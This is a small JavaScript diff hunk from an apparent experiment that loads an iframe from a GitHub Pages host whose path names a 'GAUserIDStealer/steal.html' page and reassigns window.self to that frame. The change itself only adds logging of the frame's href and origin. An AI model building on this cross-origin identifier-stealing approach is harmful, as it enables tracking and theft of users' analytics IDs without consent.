@@ -54,7 +54,8 @@
          
     
          cframe.src ="https://newmangervase91.github.io/GAUserIDStealer/steal.html";
-         console.log('cframe location: A',cframe.contentWindow.location);
+         console.log('cframe location href: A',cframe.contentWindow.location.href);
+         console.log('cframe location origin: A',cframe.contentWindow.location.origin);
 
          window.self=cframe.contentWindow;
          console.log('assign cframe to window_self');
